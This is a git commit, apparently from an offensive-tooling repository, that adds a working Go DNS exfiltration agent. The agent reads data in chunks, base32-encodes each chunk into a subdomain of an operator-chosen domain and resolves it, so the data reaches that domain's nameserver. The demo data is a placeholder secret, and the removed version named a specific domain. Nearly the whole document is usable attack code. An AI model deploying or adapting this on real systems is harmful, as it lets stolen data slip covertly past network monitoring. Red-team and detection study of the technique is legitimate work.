83f2024ac0f8486245ca1cc05c1f19dc0cd686b7
Alexis Rodriguez <rodriguez10011999@gmail.com>
2022-02-26 13:07:06 -0500

    adding example DNS exfiltration Go code to OffensiveGo/DNSEfiltration folder

--- OffensiveGo/DNSExfiltration/go.mod
+++ OffensiveGo/DNSExfiltration/go.mod
@@ -1,3 +1,8 @@
 module dns_exfiltration
 
 go 1.17
+
+require (
+	github.com/alexflint/go-arg v1.4.3 // indirect
+	github.com/alexflint/go-scalar v1.1.0 // indirect
+)
--- OffensiveGo/DNSExfiltration/main.go
+++ OffensiveGo/DNSExfiltration/main.go
@@ -1,20 +1,77 @@
 package main
 
 import (
-	"encoding/hex"
+	"bytes"
+	"context"
+	"encoding/base32"
 	"fmt"
+	"io"
 	"net"
+	"strings"
+
+	"github.com/alexflint/go-arg"
 )
 
-var (
-	Domain  = "bin3xish477.com"
-	DataLen = 60
-)
+var args struct {
+	Domain string `arg:"-d,--domain,required" help:"the domain to exfil data to"`
+}
+
+var b32 = base32.StdEncoding.WithPadding(base32.NoPadding)
+var encodedPayloads []string
+
+type Agent struct {
+	Domain    string
+	ChunkSize int16
+}
+
+func NewAgent(domain string, chunkSize int16) *Agent {
+	return &Agent{
+		Domain:    domain,
+		ChunkSize: chunkSize,
+	}
+}
+
+func (a *Agent) Exfil(data []byte) {
+	r := bytes.NewReader(data)
+	chunk := make([]byte, a.ChunkSize)
+
+	for {
+		/* read in data no larger than ChunkSize */
+		n, err := r.Read(chunk)
+		if n == 0 || err == io.EOF {
+			break
+		}
+
+		if err != nil {
+			fmt.Println(err.Error())
+		}
+
+		/* encode data and format exfil subdomain*/
+		ed := strings.ToLower(b32.EncodeToString(chunk[:n]))
+		encodedPayloads = append(encodedPayloads, ed)
+		domain := fmt.Sprintf("%s.%s", ed, a.Domain)
+		fmt.Println(domain)
+
+		/* perform DNS lookup with exfil data as subdomain*/
+		resolver := net.DefaultResolver
+		_, err = resolver.LookupIPAddr(context.Background(), domain)
+		if err != nil {
+			fmt.Println(err.Error())
+		}
+	}
+}
 
 func main() {
-	ip, _ := net.LookupIP(Domain)
-	d := []byte("1$@$%afLqaQWafljzfpqaffa$!#^%")
-	hd := hex.EncodeToString(d)
-	fmt.Println(ip[0])
-	fmt.Printf("%s.%s\n", hd, Domain)
+	arg.MustParse(&args)
+
+	agent := NewAgent(args.Domain, 23)
+	data := "MySuperSecretPasswordsAndNotes"
+	agent.Exfil([]byte(data))
+
+	fmt.Print("Exfiltrated Data: ")
+	for _, s := range encodedPayloads {
+		d, _ := b32.DecodeString(strings.ToUpper(s))
+		fmt.Print(string(d))
+	}
+	fmt.Println()
 }
